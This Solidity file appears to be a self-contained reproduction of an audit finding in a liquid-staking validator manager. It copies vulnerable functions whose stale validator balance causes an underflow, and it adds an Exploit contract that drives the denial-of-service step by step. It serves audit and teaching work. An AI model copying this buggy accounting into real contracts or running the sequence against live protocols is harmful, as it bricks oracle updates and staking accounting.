// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Kinetiq finding 58611 (H-03):
// "Deactivated validator retains old balance after reactivation".
//
// Protocol : Kinetiq liquid staking (Pashov Audit Group, 2025-02-26 review)
//   report   github.com/pashov/audits .../Kinetiq-security-review_2025-02-26.md
//   contract ValidatorManager
//   fns      deactivateValidator / reactivateValidator / updateValidatorPerformance
//
// The three functions below are reproduced VERBATIM from the finding's embedded
// audited source. The marked @> line is the exact line the finding flags.
//
// Root cause: deactivateValidator() creates a rebalance WITHDRAWAL request for
// the validator's balance but never zeroes `validatorData.balance` and never
// subtracts it from `totalBalance` (the finding's recommendation is to do both).
// OracleManager.updatePerformance() then skips inactive validators, so the stale
// stored balance is never refreshed. When the validator is reactivated and the
// oracle next calls updateValidatorPerformance(), the STALE `oldBalance` is
// subtracted from totalBalance:
//        totalBalance = totalBalance - oldBalance + balance;   // @>
// The withdrawn stake has already left the system (totalBalance was correctly
// reduced by the rebalance withdrawal), but `val.balance` is still the stale,
// larger value, so `totalBalance - oldBalance` underflows in Solidity 0.8 and
// reverts -> permanent DoS on the oracle update for that validator (and the
// generatePerformance batch that iterates it).
//
// Faithful doubles: an OpenZeppelin-style EnumerableSet (the pending-rebalance
// set, so `_validatorsWithPendingRebalance.contains(...)` stays verbatim); the
// pause / reentrancy / role / exists / active modifiers; addValidator (staking
// that funds a validator and grows totalBalance); and settleRebalanceWithdrawal
// (the rebalance-close path — the withdrawn HYPE genuinely leaves the staking
// system, so totalBalance is reduced by the withdrawn amount, while the buggy
// deactivateValidator left `validatorData.balance` stale-high).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal OpenZeppelin-style EnumerableSet.AddressSet so the verbatim
///      `_validatorsWithPendingRebalance.contains(validator)` line is identical
///      to the audited contract.
library EnumerableSetMini {
    struct AddressSet {
        mapping(address => bool) _member;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        if (set._member[value]) return false;
        set._member[value] = true;
        return true;
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        if (!set._member[value]) return false;
        set._member[value] = false;
        return true;
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return set._member[value];
    }
}

/// @dev Faithful minimal ERC20 marker used only to surface the DoS/accounting
///      harm as a positive balance delta at the profit SINK (no attacker payout
///      exists for this liveness/accounting bug). Represents the HYPE whose
///      accounting is bricked once the oracle update reverts.
contract MarkerToken {
    string public name = "Kinetiq Staked HYPE (bricked accounting)";
    string public symbol = "HYPE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — deactivateValidator / reactivateValidator /
// updateValidatorPerformance are reproduced VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract ValidatorManager {
    using EnumerableSetMini for EnumerableSetMini.AddressSet;

    struct Validator {
        address validatorAddress;
        bool active;
        uint256 balance;
    }

    bytes32 public constant ORACLE_ROLE = keccak256("ORACLE_ROLE");

    Validator[] private _validators;
    mapping(address => uint256) private _validatorIndex; // 1-based; 0 == not registered
    EnumerableSetMini.AddressSet private _validatorsWithPendingRebalance;
    mapping(address => uint256) private _pendingWithdrawal;

    uint256 public totalBalance;

    // ── faithful modifier doubles ──────────────────────────────────────────
    bool private _paused;
    uint256 private _reentry;
    mapping(bytes32 => mapping(address => bool)) private _roles;

    event ValidatorDeactivated(address validator);
    event ValidatorReactivated(address validator);

    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    modifier nonReentrant() {
        require(_reentry == 0, "ReentrancyGuard: reentrant call");
        _reentry = 1;
        _;
        _reentry = 0;
    }

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    modifier validatorExists(address validator) {
        require(_validatorIndex[validator] != 0, "Validator does not exist");
        _;
    }

    modifier validatorActive(address validator) {
        require(_validators[_validatorIndex[validator] - 1].active, "Validator not active");
        _;
    }

    constructor() {
        // deployer (the Exploit) is the oracle in this reproduction
        _roles[ORACLE_ROLE][msg.sender] = true;
    }

    // ── test-setup double: stake HYPE into a validator, growing totalBalance ─
    function addValidator(address validator, uint256 balance) external onlyRole(ORACLE_ROLE) {
        require(_validatorIndex[validator] == 0, "Validator exists");
        _validators.push(Validator({validatorAddress: validator, active: true, balance: balance}));
        _validatorIndex[validator] = _validators.length; // 1-based
        totalBalance += balance;
    }

    // ── faithful double of the rebalance-request creation ────────────────────
    /// @dev Records a withdrawal request and marks the validator as having a
    ///      pending rebalance. It deliberately does NOT touch validatorData.balance
    ///      or totalBalance — matching the audited code, whose omission is the bug.
    function _addRebalanceRequest(address validator, uint256 withdrawAmount) internal {
        _validatorsWithPendingRebalance.add(validator);
        _pendingWithdrawal[validator] += withdrawAmount;
    }

    // ── faithful double of the rebalance-close / withdrawal-report path ──────
    /// @dev When the withdrawal created by deactivateValidator is claimed, the
    ///      staked HYPE genuinely leaves the system, so totalBalance is reduced
    ///      by the withdrawn amount and the pending flag is cleared. A CORRECT
    ///      deactivateValidator would have already zeroed validatorData.balance
    ///      AND subtracted it from totalBalance (see finding recommendation); the
    ///      buggy version leaves validatorData.balance stale-high.
    function settleRebalanceWithdrawal(address validator) external onlyRole(ORACLE_ROLE) {
        require(_validatorsWithPendingRebalance.contains(validator), "no pending rebalance");
        uint256 amount = _pendingWithdrawal[validator];
        _pendingWithdrawal[validator] = 0;
        _validatorsWithPendingRebalance.remove(validator);
        totalBalance -= amount; // withdrawn stake left the staking system
    }

    // ═══════════════════════════════════════════════════════════════════════
    // VERBATIM: ValidatorManager.deactivateValidator
    // ═══════════════════════════════════════════════════════════════════════
    function deactivateValidator(address validator) external whenNotPaused nonReentrant validatorExists(validator) {

        // ...
        uint256 index = _validatorIndex[validator] - 1;

        Validator storage validatorData = _validators[index];

        require(validatorData.active, "Validator already inactive");

        // Create withdrawal request before state changes

        if (validatorData.balance > 0) {

            _addRebalanceRequest(validator, validatorData.balance);

        }

        // Update state after withdrawal request
        // NOTE (root cause): validatorData.balance is NEITHER zeroed NOR subtracted
        // from totalBalance here, so the stale balance survives the deactivation.

        validatorData.active = false;

        emit ValidatorDeactivated(validator);

    }

    // ═══════════════════════════════════════════════════════════════════════
    // VERBATIM: ValidatorManager.reactivateValidator
    // ═══════════════════════════════════════════════════════════════════════
    function reactivateValidator(address validator)
        external
        whenNotPaused
        nonReentrant
        validatorExists(validator)
    {

        // ...
        uint256 index = _validatorIndex[validator] - 1;

        Validator storage validatorData = _validators[index];

        require(!validatorData.active, "Validator already active");

        require(!_validatorsWithPendingRebalance.contains(validator), "Validator has pending rebalance");

        // Reactivate the validator

        validatorData.active = true;

        emit ValidatorReactivated(validator);

    }

    // ═══════════════════════════════════════════════════════════════════════
    // VERBATIM: ValidatorManager.updateValidatorPerformance (relevant body)
    // ═══════════════════════════════════════════════════════════════════════
    function updateValidatorPerformance(
        address validator,
        uint256 balance
        // ...
    ) external whenNotPaused onlyRole(ORACLE_ROLE) validatorExists(validator) validatorActive(validator) {

        // ...
        Validator storage val = _validators[_validatorIndex[validator] - 1];

        // Cache old balance for total balance update

        uint256 oldBalance = val.balance;

        // ...

        // Update total balance

        totalBalance = totalBalance - oldBalance + balance; // @> VULN: subtracts the STALE stored balance of a just-reactivated validator; deactivateValidator never zeroed val.balance, so oldBalance exceeds the (already-reduced) totalBalance -> underflow revert (DoS)

        val.balance = balance;

        // ...

    }

    // ── view helpers ─────────────────────────────────────────────────────────
    function balanceOfValidator(address validator) external view returns (uint256) {
        return _validators[_validatorIndex[validator] - 1].balance;
    }

    function isActive(address validator) external view returns (bool) {
        return _validators[_validatorIndex[validator] - 1].active;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduce the underflow DoS. A validator is deactivated (its
// stale stored balance survives), its stake is withdrawn (totalBalance drops),
// another validator is slashed so totalBalance falls below the stale balance,
// the validator is reactivated, and the routine oracle update then underflows.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MarkerToken public marker;
    ValidatorManager public vuln;

    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    address internal constant valA = address(0xA11CE);
    address internal constant valB = address(0xB0B);

    uint256 internal constant BAL_A = 100e18; // valA's staked HYPE
    uint256 internal constant BAL_B = 200e18; // valB's staked HYPE
    uint256 internal constant SLASH_B = 40e18; // valB's balance after slashing

    uint256 public staleBalance; // valA's stored balance at the failing update
    uint256 public totalBalanceAtFailure; // totalBalance at the failing update
    bool public updateReverted; // the DoS

    constructor() {
        marker = new MarkerToken(); // child nonce 1 (profit/marker token)
        vuln = new ValidatorManager(); // child nonce 2 (VULN)
    }

    function run() external {
        // 1) Two validators are staked: valA=100, valB=200, totalBalance=300.
        vuln.addValidator(valA, BAL_A);
        vuln.addValidator(valB, BAL_B);

        // 2) valA is deactivated -> a rebalance withdrawal is created, but the
        //    buggy code leaves valA.balance = 100 (stale) and totalBalance = 300.
        vuln.deactivateValidator(valA);
        require(vuln.balanceOfValidator(valA) == BAL_A, "balance should be stale after deactivation");

        // 3) The rebalance withdrawal settles: valA's 100 HYPE leaves the system,
        //    so totalBalance correctly drops to 200. valA.balance stays stale (100).
        vuln.settleRebalanceWithdrawal(valA);

        // 4) valB is slashed and the oracle reports it: totalBalance = 200 - 200 + 40 = 40.
        vuln.updateValidatorPerformance(valB, SLASH_B);

        // 5) valA is reactivated (allowed: its rebalance is no longer pending).
        vuln.reactivateValidator(valA);

        // Precondition for the underflow: stale stored balance now exceeds totalBalance.
        staleBalance = vuln.balanceOfValidator(valA); // 100e18
        totalBalanceAtFailure = vuln.totalBalance(); // 40e18
        require(staleBalance > totalBalanceAtFailure, "stale balance does not exceed totalBalance");

        // 6) Routine oracle update for the reactivated validator underflows and
        //    reverts: totalBalance = 40 - 100 + 0 -> DoS on the oracle.
        try vuln.updateValidatorPerformance(valA, 0) {
            updateReverted = false;
        } catch {
            updateReverted = true;
        }

        // HARM: the oracle's balance update permanently reverts (underflow) for
        // the reactivated validator, bricking generatePerformance updates.
        require(updateReverted, "no DoS: updateValidatorPerformance did not revert");

        // Surface the bricked-accounting magnitude at the profit SINK (marker token).
        marker.mint(SINK, staleBalance);
        require(marker.balanceOf(SINK) == staleBalance, "harm not recorded at sink");
    }
}
